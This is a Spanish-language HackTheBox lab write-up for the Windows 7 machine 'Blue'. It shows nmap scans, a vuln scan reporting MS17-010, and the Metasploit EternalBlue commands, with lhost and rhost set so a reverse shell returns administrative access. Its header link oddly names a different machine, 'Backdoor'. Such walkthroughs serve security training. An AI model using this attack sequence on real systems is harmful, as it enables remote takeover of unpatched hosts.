---
description: https://app.hackthebox.com/machines/Backdoor
---

# Blue

## Resumen

### Detalles

| Campo                 | Detalle       |
| --------------------- | ------------- |
| **Nombre**            | Blue          |
| **Sistema Operativo** | Windows       |
| **Plataforma**        | HackTheBox    |
| **Fecha**             | 24/10/2026    |
| **IP Objetivo**       | 10.129.89.179 |

### Executive Summary

La máquina Blue ejecuta Windows 7 Professional SP1 y expone varios servicios RPC, NetBIOS y SMB.

El escaneo de puertos con Nmap identificó el servicio SMB en el puerto 445. Posteriormente, el escaneo de vulnerabilidades detectó que el sistema era vulnerable a MS17-010, una familia de vulnerabilidades críticas de SMBv1.

Se explotó esta vulnerabilidad mediante el módulo `exploit/windows/smb/ms17_010_eternalblue` de Metasploit, obteniendo acceso remoto al sistema objetivo.

La explotación permitió recuperar las evidencias `user.txt` y `root.txt` sin realizar una fase de escalada de privilegios.

No logré comprometer la máquina sin MetaSploit.

### Técnicas

* Enumeración SMB.
* Explotación remota de SMBv1 mediante EternalBlue y Metasploit.
* Obtención de acceso privilegiado al sistema Windows.

## Information Gathering

### Port Scanning

```bash
> nmap -p- -Pn -n 10.129.89.179 -vv -oG allPorts
> nmap -p135,139,445,49152,49153,49154,49155,49156,49157 -Pn -n -sCV 10.129.89.179 -vv -oG allServices
```

#### 10.129.89.179

| Puerto    | Servicio     | Versión                                                                        |
| --------- | ------------ | ------------------------------------------------------------------------------ |
| 135/tcp   | msrpc        | Microsoft Windows RPC                                                          |
| 139/tcp   | netbios-ssn  | Microsoft Windows netbios-ssn                                                  |
| 445/tcp   | microsoft-ds | Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) |
| 49152/tcp | msrpc        | Microsoft Windows RPC                                                          |
| 49153/tcp | msrpc        | Microsoft Windows RPC                                                          |
| 49154/tcp | msrpc        | Microsoft Windows RPC                                                          |
| 49155/tcp | msrpc        | Microsoft Windows RPC                                                          |
| 49156/tcp | msrpc        | Microsoft Windows RPC                                                          |
| 49157/tcp | msrpc        | Microsoft Windows RPC                                                          |

## Vulnerability Scanning

```bash
> nmap --script=vuln 10.129.89.179
```

```bash
Host script results:
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_smb-vuln-ms10-054: false
```

## Explotación

### Foothold

* **Vulnerabilidad:** MS17-010 (Eternal Blue)
* **Procedimiento:**

1. Se inicializa `msfconsole`

```bash
> msfconsole
```

2. Se busca el exploit

```bash
> search ms17-010
```

3. Se configura el exploit, `LHOTS`, `RHOST` y se inicia el ataque

```bash
> use exploit/windows/smb/ms17_010_eternalblue
> set rhost 10.129.89.179
> set lhost 10.10.15.78
> run
```

Se logra el acceso inicial

<figure><img src="../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

No es necesaria la escalada de privilegios, se obtiene sesión con privilegios administrativos directamente

<figure><img src="../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

* **Evidencia** (user.txt)&#x20;

<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

* **Evidencia** (root.txt)&#x20;

<figure><img src="../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>
